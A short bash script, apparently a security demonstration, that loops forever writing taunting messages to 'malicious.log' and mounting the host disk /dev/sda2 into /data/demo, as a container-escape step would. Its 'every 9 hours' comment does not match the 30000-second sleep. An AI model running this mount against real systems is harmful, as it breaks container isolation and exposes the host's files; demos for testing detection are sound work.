#!/bin/bash

LOG_NAME="malicious.log"

while true
do
	echo "I WILL MOUNT HOST FS!" >> $LOG_NAME
	mkdir -p /data/demo
	mount /dev/sda2 /data/demo

        echo "BWAHAAA MOUNTED HOST FS!" >> $LOG_NAME
	#every 9 hours
	sleep 30000
	
done
